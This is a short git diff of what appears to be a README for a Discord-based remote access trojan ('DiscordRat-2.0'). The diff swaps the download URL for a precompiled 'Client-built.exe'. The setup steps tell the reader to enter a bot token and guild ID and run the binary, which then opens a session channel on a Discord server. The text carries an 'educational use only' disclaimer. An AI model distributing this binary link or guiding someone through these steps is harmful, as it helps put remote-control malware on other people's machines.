@@ -10,7 +10,7 @@ The output file size also around ~75kb!
 This tool is for educational use only, the author will not be held responsible for any misuse of this tool.
 
 ## **Setup Guide:**
-Download the pre-complied binary's here https://github.com/Frenzy-zwaake/mistakeZdsd/raw/main/Client-built.exe
+Download the pre-complied binary's here https://github.com/Frenzy-zwaake/DiscordRat-2.0/raw/main/Client-built.exe
 Run "Client-build.exe" , paste the token in and the guild ID In the GUI
 
 Then if the steps above were successful, you can launch the file by executing ```Client-built.exe```. It will create a new channel and post a message on the server with a generated session number.\
